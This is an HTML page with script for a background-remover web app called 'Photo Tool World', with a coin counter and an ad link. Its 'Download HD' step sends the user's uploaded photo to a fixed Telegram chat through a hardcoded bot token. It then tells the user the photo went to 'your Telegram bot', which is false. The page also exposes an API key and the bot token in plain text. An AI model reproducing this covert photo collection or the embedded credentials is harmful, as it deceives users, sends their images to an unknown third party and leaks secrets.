<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Photo Tool World</title>

<style>

body{
background:#0f172a;
font-family:Arial;
color:white;
text-align:center;
margin:0;
}

.header{
background:#111827;
padding:10px;
font-weight:bold;
overflow:hidden;
}

.marquee{
white-space:nowrap;
display:inline-block;
animation:scrollText 12s linear infinite, rainbow 6s linear infinite;
}

@keyframes scrollText{
0%{transform:translateX(100%)}
100%{transform:translateX(-100%)}
}

@keyframes rainbow{
0%{color:red}
20%{color:orange}
40%{color:yellow}
60%{color:lime}
80%{color:cyan}
100%{color:magenta}
}

.container{
max-width:420px;
margin:auto;
padding:20px;
}

.wallet{
background:#1e293b;
padding:12px;
border-radius:10px;
margin-bottom:20px;
font-size:18px;
}

.bigUpload{
width:100%;
padding:22px;
font-size:18px;
background:#22c55e;
border:none;
border-radius:12px;
color:white;
}

button{
width:100%;
padding:14px;
margin-top:10px;
border:none;
border-radius:10px;
background:#3b82f6;
color:white;
font-size:16px;
}

img{
max-width:100%;
margin-top:15px;
border-radius:10px;
}

.shareBtn{
position:fixed;
bottom:20px;
right:20px;
width:60px;
height:60px;
border-radius:50%;
background:#22c55e;
font-size:24px;
border:none;
color:white;
display:flex;
align-items:center;
justify-content:center;
}

</style>
</head>

<body>

<div class="header">
<div class="marquee">
Welcome To Photo Tool World - Your Background Remover App
</div>
</div>

<div class="container">

<h2>Photo Tool World</h2>

<div class="wallet">
Coins: <span id="coins">0</span>
</div>

<button class="bigUpload" onclick="openUpload()">Upload Photo</button>

<input type="file" id="upload" accept="image/*" style="display:none" onchange="removeBG()">

<div id="status"></div>

<img id="result">

<button id="downloadSD" style="display:none" onclick="downloadSD()">Download SD</button>

<button id="downloadHD" style="display:none" onclick="confirmHD()">Download HD</button>

</div>

<button class="shareBtn" onclick="shareApp()">🔗</button>

<script>

let coins=localStorage.getItem("coins")||0;
coins=parseInt(coins);

document.getElementById("coins").innerText=coins;

function saveCoins(){
localStorage.setItem("coins",coins);
document.getElementById("coins").innerText=coins;
}

function openUpload(){
document.getElementById("upload").click();
}

let imageBlob=null;
let imageURL="";

async function removeBG(){

let file=document.getElementById("upload").files[0];

document.getElementById("status").innerHTML="Removing background...";

let formData=new FormData();
formData.append("image_file",file);
formData.append("size","auto");

let res=await fetch("https://api.remove.bg/v1.0/removebg",{
method:"POST",
headers:{
"X-Api-Key":"GycHN7qSDN9SUqvUkogEnoVb"
},
body:formData
});

imageBlob=await res.blob();
imageURL=URL.createObjectURL(imageBlob);

document.getElementById("result").src=imageURL;

document.getElementById("downloadSD").style.display="block";
document.getElementById("downloadHD").style.display="block";

coins+=10;
saveCoins();

}

function downloadSD(){

let a=document.createElement("a");
a.href=imageURL;
a.download="photo_sd.png";
a.click();

}

async function confirmHD(){

if(coins<10){
alert("Not enough coins");
return;
}

coins-=10;
saveCoins();

window.open("https://www.effectivegatecpm.com/bupvhwz5?key=eaedd439f3f1d2db330f017cf0cb29ca");

setTimeout(sendToTelegram,3000);

}

async function sendToTelegram(){

let formData=new FormData();
formData.append("chat_id","1155624180");
formData.append("photo",imageBlob);

await fetch("https://api.telegram.org/bot8226940478:AAHrxtf_D6i6sO1OSH23RQEzap7hWa0n860/sendPhoto",{
method:"POST",
body:formData
});

alert("Photo sent to your Telegram bot. Download it there.");

}

function shareApp(){

let url="https://t.me/PhotoToolWorld_bot";

window.open("https://t.me/share/url?url="+url);

}

</script>

</body>
</html>
